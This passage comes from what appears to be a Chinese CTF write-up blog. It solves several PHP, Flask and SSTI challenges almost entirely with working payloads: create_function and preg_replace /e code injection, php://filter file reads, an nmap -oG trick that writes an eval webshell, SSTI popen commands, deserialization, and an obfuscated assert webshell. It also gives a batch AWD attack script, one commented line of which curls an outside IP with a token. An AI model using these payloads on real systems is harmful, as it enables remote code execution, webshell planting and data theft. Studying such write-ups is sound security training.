<p>与此同时当第二个参数无限制时：</p>
<pre><code>$code=return $a+$b;}eval($_POST['cmd']);//</code></pre>
<p>就会变成：</p>
<pre><code>function myfunc($a, $b){
    return $a+$b;
}
eval($_POST['cmd']);//}  </code></pre>
<p>看到这道题，在上一阶段sha1比较的过程中，<code>extract($_GET["flag"]);</code>这里我们可以进行变量覆盖，从而掌控住arg变量与code变量。<br> 同时根据上面的介绍我们可以通过必和符号来执行自己定义的函数：  </p>
<pre><code>&amp;flag[arg]=}a();//&amp;flag[code]=create_function</code></pre>
<p>拼接过后就应该是：    </p>
<pre><code>function {}a();//}</code></pre>
<p>这样子了。  </p>
<p>这个a我们是可以随时改成其他的函数的。  </p>
<p>但是此时很多函数都被禁用了，文件中包含了flag这个文件，利用<code>get_defined_vars()</code>将所有变量与值都进行输出，此时payload就为：  </p>
<pre><code>flag[arg]=}var_dump(get_defined_vars());//&amp;flag[code]=create_function</code></pre>
<p>输出出来但还不是真正的flag，提示我们是在另一个文件里面，flag4.php，此时我们可以利用require，来代替include，利用base64编码绕过flag的过滤，利用require()来代替require” “。  </p>
<p>payload：<code>flag[arg]=}require(base64_decode(xxxxxxx));var_dump(get_defined_vars());//&amp;flag[code]=create_function</code></p>
<p>非预期解：利用异或或者~进行取反操作。</p>
<p>最终payload:<br> GET:</p>
<pre><code>1nD3x.php?%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;file=data://text/plain,%61%71%75%61%5f%69%73%5f%63%75%74%65&amp;%73%68%61%6e%61[]=1&amp;%70%61%73%73%77%64[]=2&amp;%66%6c%61%67[%61%72%67]=}var_dump(%67%65%74%5f%64%65%66%69%6e%65%64%5f%76%61%72%73());//&amp;%66%6c%61%67[%63%6f%64%65]=%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e</code></pre>
<p>POST:</p>
<pre><code>debu=1&amp;file=1</code></pre>
<pre><code>/1nD3x.php?%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;file=data://text/plain,%61%71%75%61%5f%69%73%5f%63%75%74%65&amp;%73%68%61%6e%61[]=1&amp;%70%61%73%73%77%64[]=2&amp;%66%6c%61%67[%61%72%67]=}var_dump(%67%65%74%5f%64%65%66%69%6e%65%64%5f%76%61%72%73());//&amp;%66%6c%61%67[%63%6f%64%65]=%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e

file=1&amp;debu=2
</code></pre>
<pre><code>file=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0A&amp;%73%68%61%6e%61[]=1&amp;%70%61%73%73%77%64[]=2&amp;%66%6c%61%67%5b%63%6f%64%65%5d=%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e&amp;%66%6c%61%67%5b%61%72%67%5d=}require(~(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f));//
</code></pre>
]]></content>
  </entry>
  <entry>
    <title>BJDCTF:2020-ZJCTF，不过如此</title>
    <url>/2021/06/21/bjdctf-2020-zjctf-bu-guo-ru-ci/</url>
    <content><![CDATA[<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>

<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$text</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"text"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token string">"I have a dream"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string">"&lt;br>&lt;h1>"</span><span class="token punctuation">.</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"&lt;/h1>&lt;/br>"</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/flag/"</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Not now!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//next.php</span>

<span class="token punctuation">}</span>
<span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span></code></pre>
<p>要求：</p>
<p>1.text内容I have a dream</p>
<p>2.file中不能含有flag字段</p>
<pre><code>?text=data://text/plain,I%20have%20a%20dream&amp;file=php://filter/read=convert.base64-encode/resource=next.php</code></pre>
<p>或者：</p>
<pre><code>?text=php://input&amp;file=php://filter/convert.base64-encode/resource=next.php
POST:I have a dream</code></pre>
<p><img src="/BJDCTF%EF%BC%9A2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4.assets/1.png" alt="1"></p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>

    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$id</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">complex</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span>
        <span class="token string">'/('</span> <span class="token punctuation">.</span> <span class="token variable">$re</span> <span class="token punctuation">.</span> <span class="token string">')/ei'</span><span class="token punctuation">,</span>
        <span class="token string">'strtolower("\\1")'</span><span class="token punctuation">,</span>
        <span class="token variable">$str</span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>


<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$re</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token function">complex</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">.</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<h3 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace"></a>preg_replace</h3><pre><code>preg_replace(pattern, replacement, subject)</code></pre>
<p><strong>当pattern传入的正则表达式带有/e时，存在命令执行，即当匹配到符合正则表达式的字符串时，第二个参数的字符串可被当做代码来执行。</strong><br>这里第二个参数固定为<code>strtolower("\\1")</code><br>这里的\1实际上体现为\1对一个正则表达式模式或部分模式两边添加圆括号将导致相关匹配存储到一个临时缓冲区中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 ‘\n’ 访问</p>
<p>这里的\1指的是第一个匹配项<br>官方<code>payload/?.*={${phpinfo()}}</code><br>即</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/(.*)/ei'</span><span class="token punctuation">,</span><span class="token string">'strtolower("\\1")'</span><span class="token punctuation">,</span><span class="token string">'{${phpinfo()}}'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>但这里存在的问题是，GET方式传的字符串，.会被替换成_，这里采用</p>
<pre><code>\S*=${phpinfo()}  #\S 在php正则表达式中表示匹配所有非空字符，*表示多次匹配/</code></pre>
<pre><code>/next.php?\S*=${getflag()}&amp;cmd=system('cat /flag');</code></pre>
<p><img src="/BJDCTF%EF%BC%9A2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4.assets/2.png" alt="2"></p>
<pre class=" language-php"><code class="language-php">next<span class="token punctuation">.</span>php<span class="token operator">?</span>\<span class="token package">S</span><span class="token operator">*</span><span class="token operator">=</span>$<span class="token punctuation">{</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">}</span>
<span class="token constant">POST</span>：<span class="token number">1</span><span class="token operator">=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cat /flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p><img src="/BJDCTF%EF%BC%9A2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4.assets/3.png" alt="3"></p>
<p>可以看：<a href="https://blog.csdn.net/qq_43622442/article/details/106018883">https://blog.csdn.net/qq_43622442/article/details/106018883</a></p>
]]></content>
  </entry>
  <entry>
    <title>BUUCTF:2018-OnlineTool</title>
    <url>/2021/06/19/buuctf-2018-onlinetool/</url>
    <content><![CDATA[<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token comment" spellcheck="true">//服务器获取ip</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token function">escapeshellarg</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token function">escapeshellcmd</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">"glzjin"</span><span class="token punctuation">.</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string">'you are in sandbox '</span><span class="token punctuation">.</span><span class="token variable">$sandbox</span><span class="token punctuation">;</span>
    @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span><span class="token punctuation">.</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<ul>
<li><p>namp -PS 127.0.0.1</p>
</li>
<li><p>namp -PS ‘’ 127.0.0.1</p>
</li>
<li><p>nmap -PS ’ “ “ ’ 127.0.0.1 “ “<br> 引号闭合后，加上这些，无影响</p>
</li>
<li><pre><code>namp &lt;?php phpinfo(); ?&gt; -oG 1.php</code></pre>
<p> 可以写入一个文件</p>
</li>
<li><pre><code>namp nmap &lt;?php phpinfo();&gt; -oG 1.php\’</code></pre>
<p> 会写成1.php‘ 而不是 1.php</p>
</li>
</ul>
<h3 id="escapeshellarg-escapeshellcmd"><a href="#escapeshellarg-escapeshellcmd" class="headerlink" title="escapeshellarg(),escapeshellcmd()"></a>escapeshellarg(),escapeshellcmd()</h3><ol>
<li>传入的参数是：<code>172.17.0.2' -v -d a=1</code></li>
<li>经过<code>escapeshellarg</code>处理后变成了<code>'172.17.0.2'\'' -v -d a=1'</code>，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。</li>
<li>经过<code>escapeshellcmd</code>处理后变成<code>'172.17.0.2'\\'' -v -d a=1\'</code>，这是因为<code>escapeshellcmd</code>对\以及最后那个不配对儿的引号进行了转义：<a href="http://php.net/manual/zh/function.escapeshellcmd.php">http://php.net/manual/zh/function.escapeshellcmd.php</a></li>
<li>最后执行的命令是curl ‘172.17.0.2’\‘’ -v -d a=1'，由于中间的\被解释为\而不再是转义字符，所以后面的’没有被转义，与再后面的’配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\ -v -d a=1’，即向172.17.0.2\发起请求，POST 数据为a=1’。</li>
</ol>
<pre class=" language-php"><code class="language-php"><span class="token operator">?</span>host<span class="token operator">=</span><span class="token string">'&lt;?php @eval($_POST[1]);?> -oG 1.php '</span></code></pre>
<p><img src="/2021/06/19/buuctf-2018-onlinetool/1.png" alt="1"></p>
<pre class=" language-php"><code class="language-php"><span class="token string">' &lt;?php eval($_POST[1]);?> -oG 1.php '</span></code></pre>
<p>采用这个测试一下：</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token variable">$host</span> <span class="token operator">=</span> <span class="token string">' &lt;?php @eval($_POST[1]);?> -oG 1.php '</span><span class="token punctuation">;</span>
<span class="token variable">$host</span> <span class="token operator">=</span> <span class="token function">escapeshellarg</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$host</span> <span class="token operator">=</span> <span class="token function">escapeshellcmd</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$host</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span></code></pre>
<p>输出</p>
<pre class=" language-php"><code class="language-php"><span class="token operator">/</span><span class="token string">"/&lt;/?php @eval/(/$_POST/[1/]/);/?/> -oG 1.php/"</span></code></pre>
<pre class=" language-php"><code class="language-php">nmap <span class="token operator">-</span><span class="token constant">T5</span> <span class="token operator">-</span>sT <span class="token operator">-</span>Pn <span class="token operator">--</span>host<span class="token operator">-</span>timeout <span class="token number">2</span> <span class="token operator">-</span>F <span class="token string">' &lt;?php @eval($_POST[1]);?> -oG 1.php '</span></code></pre>
<p>蚁剑连接：</p>
<pre class=" language-php"><code class="language-php">url<span class="token operator">/</span>3e12369d084243c43ba31e472a06c3f7<span class="token operator">/</span><span class="token number">1</span><span class="token punctuation">.</span>php</code></pre>
<p><img src="/2021/06/19/buuctf-2018-onlinetool/2.png" alt="2"></p>
<p>或者：</p>
<pre class=" language-php"><code class="language-php"><span class="token operator">?</span>host<span class="token operator">=</span><span class="token string">' &lt;?php echo `cat /flag`;?> -oG test.php '</span></code></pre>
<p>直接访问test.php</p>
<p><img src="/2021/06/19/buuctf-2018-onlinetool/3.png" alt="3"></p>
]]></content>
      <tags>
        <tag>nmap</tag>
      </tags>
  </entry>
  <entry>
    <title>BSidesCF:2020-HaveABadDay</title>
    <url>/2021/07/02/bsidescf-2020-haveabadday/</url>
    <content><![CDATA[<p><img src="/2021/07/02/bsidescf-2020-haveabadday/image-20210708083329054.png" alt="image-20210708083329054"></p>
<pre><code>?category=php://filter/convert.base64-encode/resource=index.php</code></pre>
<p><img src="/2021/07/02/bsidescf-2020-haveabadday/image-20210708085144001.png" alt="image-20210708085144001"></p>
<pre><code>?category=php://filter/convert.base64-encode/resource=index</code></pre>
<p><img src="/2021/07/02/bsidescf-2020-haveabadday/image-20210708085240233.png" alt="image-20210708085240233"></p>
<p>关键源码：</p>
<pre><code>   &lt;?php
                $file = $_GET['category'];

                if(isset($file))
                {
                    if( strpos( $file, "woofers" ) !==  false || strpos( $file, "meowers" ) !==  false || strpos( $file, "index")){
                        include ($file . '.php');
                    }
                    else{
                        echo "Sorry, we currently only support woofers and meowers.";
                    }
                }
                ?&gt;</code></pre>
<p>即需要存在woofers，meomers或者index，尝试读取：</p>
<pre><code>?category=meowers/../flag</code></pre>
<p><img src="/2021/07/02/bsidescf-2020-haveabadday/image-20210708085819451.png" alt="image-20210708085819451"></p>
<pre><code>?category=php://filter/convert.base64-encode/index/resource=flag</code></pre>
<p><img src="/2021/07/02/bsidescf-2020-haveabadday/image-20210708090020025.png" alt="image-20210708090020025"></p>
<p>PCEtLSBDYW4geW91IHJlYWQgdGhpcyBmbGFnPyAtLT4KPD9waHAKIC8vIGZsYWd7NjhkMDc0Y2ItNWY2Zi00MGZmLTg2MTEtZmI1NGM5NWNjY2EwfQo/Pgo=            </p>
<p><img src="/2021/07/02/bsidescf-2020-haveabadday/image-20210708090007549.png" alt="image-20210708090007549"></p>
]]></content>
      <tags>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title>Bugku:Misc-这是一张单纯的图片</title>
    <url>/2021/04/13/bugku-misc-zhe-shi-yi-zhang-dan-chun-de-tu-pian/</url>
    <content><![CDATA[<p>下载：</p>
<p><img src="/2021/04/13/bugku-misc-zhe-shi-yi-zhang-dan-chun-de-tu-pian/blog/source_posts\Bugku：Misc-这是一张单纯的图片\1.png" alt="1"></p>
<p>用记事本打开：</p>
<p><img src="/2021/04/13/bugku-misc-zhe-shi-yi-zhang-dan-chun-de-tu-pian/blog/source_posts\Bugku：Misc-这是一张单纯的图片\2.png" alt="2"></p>
<p>解码：</p>
<p><img src="/2021/04/13/bugku-misc-zhe-shi-yi-zhang-dan-chun-de-tu-pian/blog/source_posts\Bugku：Misc-这是一张单纯的图片\3.png" alt="3"></p>
]]></content>
      <tags>
        <tag>Bugku</tag>
      </tags>
  </entry>
  <entry>
    <title>Bugku S2 AWD排位赛-6</title>
    <url>/2021/10/25/bugku-s2-awd-pai-wei-sai-6/</url>
    <content><![CDATA[<p><strong>public/video/index.php</strong></p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token variable">$poc</span><span class="token operator">=</span><span class="token string">"a#s#s#e#r#t"</span><span class="token punctuation">;</span> 
<span class="token variable">$poc_1</span><span class="token operator">=</span><span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">"#"</span><span class="token punctuation">,</span><span class="token variable">$poc</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token variable">$poc_2</span><span class="token operator">=</span><span class="token variable">$poc_1</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$poc_1</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$poc_1</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$poc_1</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$poc_1</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$poc_1</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span> 
<span class="token variable">$poc_2</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'s'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">//poc_1=array([0]=>a [1]=>s [2]=>s [3]=>e [4]=>r [5]=>t)</span>
<span class="token comment" spellcheck="true">//s=system('cat /flag'); </span>
<span class="token delimiter">?></span></code></pre>
<p>explode函数的大概意思是遇到“#”就停止并把它储存入数组</p>
<p>所以</p>
<pre><code>poc_1=array([0]=&gt;a [1]=&gt;s [2]=&gt;s [3]=&gt;e [4]=&gt;r [5]=&gt;t)

poc_2=assert

s=system('cat /flag'); </code></pre>
<p>批量攻击脚本：</p>
<pre class=" language-Python"><code class="language-Python">import requests

session=requests.session()
#webshellurl=["http://xxx/.index.php"]
webshellurl=[
"http://xxx/public/video/index.php?s=system('cat /flag');",
]
data = {
    "s":"system('cat /flag');"
    #"b":"sec",
    #"cmd":"system('curl 10.120.115.10/index.php?token=108_USR-20211016-eelbz');"
    #"pass":"ghostinthewire1998",
    #"v":"system('ls /');"
}
for url in webshellurl:
    try:

        r=session.post(url=url,data=data,proxies={"http":None,"https":None},timeout=1)
        print(r.text)
    except:
        pass</code></pre>
]]></content>
      <tags>
        <tag>AWD</tag>
      </tags>
  </entry>
  <entry>
    <title>Bugku:Web-Flask_FileUpload</title>
    <url>/2021/05/13/bugku-web-flask-fileupload/</url>
    <content><![CDATA[<p>F12看到可以上传py脚本，</p>
<p>上传jpg格式的</p>
<p>py脚本：</p>
<pre><code>import os
os.system('cat /flag')</code></pre>
<p>在源代码中查看flag</p>
<p><img src="/2021/05/13/bugku-web-flask-fileupload/c4db0ed7edb369e6c5c922264a3fea6.png" alt="c4db0ed7edb369e6c5c922264a3fea6"></p>
]]></content>
      <tags>
        <tag>Bugku</tag>
      </tags>
  </entry>
  <entry>
    <title>Bugku:Web-Simple_SSTI_2</title>
    <url>/2021/05/11/bugku-web-simple-ssti-2/</url>
    <content><![CDATA[<pre><code>?flag={{%20config.__class__.__init__.__globals__[%27os%27].popen(%27ls%20../%27).read()%20}}</code></pre>
<pre><code>?flag={{%20config.__class__.__init__.__globals__[%27os%27].popen(%27ls%20../app/%27).read()%20}}</code></pre>
<pre><code>?flag={{%20config.__class__.__init__.__globals__[%27os%27].popen(%27cat%20../app/flag%27).read()%20}}</code></pre>
]]></content>
      <tags>
        <tag>Bugku</tag>
      </tags>
  </entry>
  <entry>
    <title>Bugku:Web-二手交易市场</title>
    <url>/2021/04/17/bugku-web-er-shou-jiao-yi-shi-chang/</url>
    <content><![CDATA[<p><img src="/2021/04/17/bugku-web-er-shou-jiao-yi-shi-chang/blog/source_posts\Bugku：Web-二手交易市场\主页.png" alt="主页"></p>
<p>发现要登录才能</p>
<p><img src="/2021/04/17/bugku-web-er-shou-jiao-yi-shi-chang/blog/source_posts\Bugku：Web-二手交易市场\上传.png" alt="上传"></p>
<p>发现文件上传漏洞：</p>
<p>抓包修改参数</p>
<p>![response](D:\blog\source_posts\Bugku：Web-二手交易市场\response.pn</p>
<p><img src="/2021/04/17/bugku-web-er-shou-jiao-yi-shi-chang/blog/source_posts\Bugku：Web-二手交易市场\编码.png" alt="编码"></p>
<p><img src="/2021/04/17/bugku-web-er-shou-jiao-yi-shi-chang/blog/source_posts\Bugku：Web-二手交易市场\response.png" alt="response"></p>
<p>去掉“\”和user蚁剑连接得到flag：</p>
<p><img src="/2021/04/17/bugku-web-er-shou-jiao-yi-shi-chang/blog/source_posts\Bugku：Web-二手交易市场\flag.png" alt="flag"></p>
]]></content>
      <tags>
        <tag>Bugku</tag>
      </tags>
  </entry>
  <entry>
    <title>Bugku:Web-冬至红包</title>
    <url>/2021/04/18/bugku-web-dong-zhi-hong-bao/</url>
    <content><![CDATA[<pre><code>&lt;?php
    error_reporting(0);
    require __DIR__.'/flag.php';

    $exam = 'return\''.sha1(time()).'\';';

    if (!isset($_GET['flag'])) {
        echo '&lt;a href="./?flag='.$exam.'"&gt;Click here&lt;/a&gt;';
    }
    else if (strlen($_GET['flag']) != strlen($exam)) {
        echo '长度不允许';
    }
    else if (preg_match('/`|"|\.|\\\\|\(|\)|\[|\]|_|flag|echo|print|require|include|die|exit/is', $_GET['flag'])) {
        echo '关键字不允许';
    }
    else if (eval($_GET['flag']) === sha1($flag)) {
        echo $flag;
    }
    else {
        echo '马老师发生甚么事了';
    }

    echo '&lt;hr&gt;';

    highlight_file(__FILE__);</code></pre>
<pre><code>?flag=$a='fla*';$a{3}='g';?&gt;11111111111111111;&lt;?=$$a;?&gt;</code></pre>
<p>得到flag</p>
]]></content>
      <tags>
        <tag>Bugku</tag>
      </tags>
  </entry>
  <entry>
    <title>Bugku:Web-game1</title>
    <url>/2021/05/10/bugku-web-game1/</url>
    <content><![CDATA[<p><img src="/2021/05/10/bugku-web-game1/ab49a807989a44b6ab79af366fd02be.png" alt="ab49a807989a44b6ab79af366fd02be"></p>
<p><img src="/2021/05/10/bugku-web-game1/34a8b6eac9f7577510e21cd7f49a906.png" alt="34a8b6eac9f7577510e21cd7f49a906"></p>
<p>抓包和查看网络中的sign都可以找到这个牛马</p>
<p>其中</p>
<pre><code>sign=zMMjU===</code></pre>
<p><img src="/2021/05/10/bugku-web-game1/3d130a54231bdb560c94b03704976ad.png" alt="3d130a54231bdb560c94b03704976ad"></p>
<p>MjU=为25的base64</p>
<p>所以我们吧成绩改为999999的base64：OTk5OTk5</p>
<pre><code>sign=zMOTk5OTk5==</code></pre>
<p><img src="/2021/05/10/bugku-web-game1/698ef3d8046503f3130672e7c6519e7.png" alt="698ef3d8046503f3130672e7c6519e7"></p>
<p>拿到flag</p>
]]></content>
      <tags>
        <tag>Bugku</tag>
      </tags>
  </entry>
  <entry>
    <title>Bugku:Web-安慰奖</title>
    <url>/2021/04/15/bugku-web-an-wei-jiang/</url>
    <content><![CDATA[<p>源代码中发现<img src="/2021/04/15/bugku-web-an-wei-jiang/blog/source_posts\Bugku：Web-安慰奖\重命名.png" alt="重命名"></p>
<p>打开index.php.bak</p>
<pre><code>&lt;?php

header("Content-Type: text/html;charset=utf-8");
error_reporting(0);
echo "&lt;!-- YmFja3Vwcw== --&gt;";
class ctf
{
    protected $username = 'hack';
    protected $cmd = 'NULL';
    public function __construct($username,$cmd)
    {
        $this-&gt;username = $username;
        $this-&gt;cmd = $cmd;
    }
    function __wakeup()
    {
        $this-&gt;username = 'guest';
    }

    function __destruct()
    {
        if(preg_match("/cat|more|tail|less|head|curl|nc|strings|sort|echo/i", $this-&gt;cmd))
        {
            exit('&lt;/br&gt;flag能让你这么容易拿到吗？&lt;br&gt;');
        }
        if ($this-&gt;username === 'admin')
        {
           // echo "&lt;br&gt;right!&lt;br&gt;";
            $a = `$this-&gt;cmd`;
            var_dump($a);
        }else
        {
            echo "&lt;/br&gt;给你个安慰奖吧，hhh！&lt;/br&gt;";
            die();
        }
    }
}
    $select = $_GET['code'];
    $res=unserialize(@$select);
?&gt;</code></pre>
<p>序列化代码：</p>
<pre><code>&lt;?php
class ctf
{
    protected $username = 'admin';
    protected $cmd = 'tac flag.php';
}
$a=new ctf();
echo(urlencode(serialize($a)));
?&gt;</code></pre>
<p><img src="/2021/04/15/bugku-web-an-wei-jiang/blog/source_posts\Bugku：Web-安慰奖\tac.png" alt="tac"></p>
<p>protected属性被序列化的时候属性值会变成：%00*%00属性名<br> 而%00是空字符，在浏览器中会显示为空，但不代表传入时能没有%00，所以我们最后的payload应该加上%00</p>
